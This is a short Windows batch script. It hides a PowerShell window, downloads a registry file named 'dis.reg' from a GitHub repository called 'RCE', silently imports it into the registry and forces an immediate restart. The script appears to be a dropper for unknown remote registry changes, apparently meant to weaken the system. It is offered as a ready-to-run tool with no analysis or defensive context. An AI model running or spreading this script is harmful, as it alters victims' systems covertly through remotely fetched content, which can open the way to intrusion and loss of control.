@echo off
powershell.exe -windowstyle hidden "Invoke-WebRequest -Uri 'https://github.com/bruning-frighting/RCE/blob/main/dis.reg' -OutFile 'dis.reg'"

reg import dis.reg
shutdown /r /t 0
